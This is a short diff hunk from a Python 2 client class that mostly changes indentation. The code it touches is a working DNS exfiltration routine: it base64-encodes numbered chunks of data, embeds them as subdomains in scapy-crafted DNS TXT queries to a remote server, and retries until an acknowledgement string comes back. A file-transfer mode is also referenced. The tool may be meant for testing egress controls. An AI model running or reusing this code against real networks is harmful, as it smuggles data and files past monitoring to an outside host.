@@ -76,33 +76,33 @@ class Client:
                     check_total = True
                     encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
-                if check_total:
-                    self.current_total = packet_number + packet_diff
-                    check_total = False
+                    if check_total:
+                        self.current_total = packet_number + packet_diff
+                        check_total = False
 
-                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
+                    print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
 
-                # Craft the packet with scapy
-                try:
-                    while True:
+                    # Craft the packet with scapy
+                    try:
+                        while True:
 
-                        response_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
-                            rd=1, id=15, opcode=0,
-                            qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="TXT")], aa=1, qr=0),
-                            verbose=False, timeout=2)
+                            response_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
+                                rd=1, id=15, opcode=0,
+                                qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="TXT")], aa=1, qr=0),
+                                verbose=False, timeout=2)
 
-                        if response_packet:
-                            if response_packet.haslayer(DNSRR):
-                                dnsrr_strings = repr(response_packet[DNSRR])
-                                if str(packet_number) + "allgoodhere" in dnsrr_strings:
-                                    break
-                except KeyboardInterrupt:
-                    print "You just rage quit!"
-                    sys.exit()
+                            if response_packet:
+                                if response_packet.haslayer(DNSRR):
+                                    dnsrr_strings = repr(response_packet[DNSRR])
+                                    if str(packet_number) + "allgoodhere" in dnsrr_strings:
+                                        break
+                    except KeyboardInterrupt:
+                        print "You just rage quit!"
+                        sys.exit()
 
-            # Increment counters
-            byte_reader += self.length
-            packet_number += 1
+                # Increment counters
+                byte_reader += self.length
+                packet_number += 1
 
             if self.file_transfer is not False:
 
